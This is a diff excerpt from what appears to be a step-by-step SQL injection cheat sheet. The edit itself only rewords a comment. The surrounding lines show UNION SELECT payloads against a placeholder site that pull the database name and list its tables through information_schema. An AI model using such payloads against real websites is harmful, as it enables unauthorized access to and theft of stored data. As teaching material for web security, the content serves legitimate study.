@@ -13,7 +13,7 @@ http://my.vulnerablesite.com/blog?id=0 UNION SELECT 1,2,3 [where '1,2,3' are the
 
 /*STEP 3 - Start enumerating*/
 --Search for DB:
-http://my.vulnerablesite.com/blog?id=0 UNION SELECT 1,2,database() [got DB name! For this example is 'sitedb']
+http://my.vulnerablesite.com/blog?id=0 UNION SELECT 1,2,database() [got DB name! In this example is 'sitedb']
 
 --Search for tables in DB:
 http://my.vulnerablesite.com/blog?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sitedb' [got tables! In this db, there are 3 tables: 'blog_entries', 'users', 'blog_categories']
